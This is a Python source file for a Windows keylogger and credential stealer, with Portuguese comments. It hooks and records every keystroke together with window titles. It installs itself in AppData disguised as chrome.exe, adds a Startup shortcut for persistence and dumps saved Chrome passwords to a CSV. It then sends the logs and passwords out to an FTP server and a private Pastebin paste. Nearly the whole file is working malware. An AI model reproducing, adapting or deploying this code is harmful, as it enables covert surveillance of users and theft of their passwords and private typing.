'''
***********************************************************
*                                                         *
*  @author: Daniel Sousa                                  *
*  @email: sousa.dfs@gmail.com                            *
*                                                         *
***********************************************************
'''

import pyHook, pythoncom, logging, os, socket, win32gui, shutil, win32com.client, chromepass, time, ftp
from Pastebin import PastebinAPI
from threading import Thread


class KeyLogger(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        # Cria o arquivo se ele nao existir
        open_log = open(file_log, "wb")
        logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
        logging.log(10, "CARACTERES ESPECIAIS / ACENTOS / SHIFT / CAPSLOCK / ENTER -> [*]\n")
        acc = False

        def OnKeyboardEvent(event):
            global file_log
            global acc
            global lastWindow
            window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if window != lastWindow:
                lastWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                logging.log(10, str("# " + window))

            try:
                if (event.Ascii == 0) and (acc is False):
                    logging.log(10, "[*]")
                    acc = True
                else:
                    acc = False
                    if event.Ascii != 0:
                        logging.log(10, chr(event.Ascii))
            except:
                None

            return True

        # Cria um objeto HookManager
        hm = pyHook.HookManager()
        hm.KeyDown = OnKeyboardEvent

        # Define o Hook
        hm.HookKeyboard()

        # Keylogger inicializado
        print("Keylogger inicializado.")

        # Loop Infinito
        pythoncom.PumpMessages()

# Creditos
print("")
print("********************************")
print("*                              *")
print("*  Criado por: Daniel Sousa    *")
print("*  Email: sousa.dfs@gmail.com  *")
print("*                              *")
print("********************************")
print("")

# Obtem o nome do computador
pc_name = socket.gethostname()

# Obtem a data atual
data = time.strftime("%d-%m-%Y-%H-%M-%S")
dataName = pc_name + "-" + data

# Nome da janela
lastWindow = None

# Caminho do Arquivo
file_path = os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\log\\"
file_log = file_path + dataName + ".txt"
print("-> Logs salvos: ", file_log)

# Cria a pasta se ela nao existir
if not os.path.exists(os.path.dirname(file_path)):
    print("Criando pasta para gravar os logs...")
    os.makedirs(os.path.dirname(file_path))

# Inicia thread do Keylogger
t = KeyLogger()
t.start()

# Se instala na pasta AppData
path_install = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\"
file_install = path_install + "\\chrome.exe"
if not os.path.exists(os.path.dirname(path_install)):
    print("Criando pasta para se instalar no sistema...")
    os.makedirs(os.path.dirname(path_install))
if not os.path.exists(file_install):
    print("Se instalando no sistema...")
    current_path = os.getcwd()
    copy_file = current_path + "\\chrome.exe"
    if os.path.exists(copy_file):
        print("Arquivo \"chrome.exe\" detectado.")
        try:
            shutil.copyfile(copy_file, file_install)
            print("Keylogger instalado com sucesso!")
        except FileNotFoundError as e:
            print("Ocorreu um erro durante a instalacao.")
            print(e)
    else:
            print("Ocorreu um erro durante a instalacao.")
            print("Verifique se voce renomeou o arquivo para \"chrome.exe\".")

# Cria um atalho na pasta Inicializar
sh = win32com.client.Dispatch("WScript.Shell")
path_shortcut = sh.SpecialFolders("Startup")
file_shortcut = path_shortcut + "\\chrome.lnk"
if not os.path.exists(file_shortcut):
    print("Criando atalho na pasta Inicializar...")
    lnk = sh.CreateShortcut(file_shortcut)
    lnk.TargetPath = file_install
    lnk.Save()
    if os.path.exists(file_shortcut):
        print("Atalho criado com sucesso!")
    else:
        print("Ocorreu um erro ao criar um atalho na pasta Inicializar.")

# Salva as senhas do Chrome em um arquivo csv
try:
    chrome_pass = chromepass.ChromePass()
    senhas = chrome_pass.main()
    chrome_pass.csv(senhas, dataName)
except Exception as e:
    print(e)

# Envia arquivos pendentes
file_send = file_path + "send"
if os.path.exists(file_send):
    print("Arquivo \"send\" detectado.")
    pending = open(file_send, "r+")
    file_name = pending.readline()
    file_path_name = file_path + file_name + ".txt"
    pending.close()

    # Abre o arquivo para upload
    try:
        file_upload = open(file_path_name, "r+")
        read = file_upload.read()
        file_upload.close()
    except FileNotFoundError as e:
        print("Erro ao abrir logs para upload:", e)

    # Envia logs via ftp
    try:
        print("Enviando logs via ftp...")
        link = ftp.enviar_arquivo(file_path_name, file_name)
        print("-> Logs enviados via ftp:", link)
    except Exception as e:
        print("Erro ao enviar os logs via ftp:", e)

    # Envia logs ao pastebin
    '''
    > Para enviar ao pastebin voce precisa de um "dev_key" e um "user_key"
    > mais informacoes: http://pastebin.com/api

    * Para gerar o user_key execute o seguinte codigo:
      pastebin_user_key = pastebin.generate_user_key("api_devkey", "login", "senha")

    * Para gerar o dev_key entre no site: http://pastebin.com/api#1

    * Para enviar ao pastebin execute o seguinte codigo:
      pastebin.paste("api_devkey", "api_paste_code", "api_user_key", "paste_name", "paste_format", "paste_private")
    '''
    try:
        print("Enviando logs para o pastebin...")
        pastebin = PastebinAPI()
        link = pastebin.paste("xxxxxxxxxxxxxx", read, "xxxxxxxxxxxxxx", file_name, None, "private")
        print("-> Logs enviados ao pastebin:", link.decode(encoding="utf-8", errors="strict"))
    except Exception as e:
        print("Erro ao enviar os logs para o pastebin:", e)

    # Envia senhas do CHROME via ftp
    try:
        senhas_path = file_path + dataName + "-SENHAS-CHROME.csv"
        print("Enviando senhas do Chrome para o FTP...")
        link = ftp.enviar_arquivo(senhas_path, dataName + "-SENHAS-CHROME.csv")
        print("-> Senhas do Chrome enviadas:", link)
    except Exception as e:
        print("Ocorreu um erro ao enviar as senhas do Chrome via FTP:", e)

# Add a lista de envio
open_send = open(file_send, "wb")
open_send.write(bytes(dataName, "UTF-8"))
open_send.close()


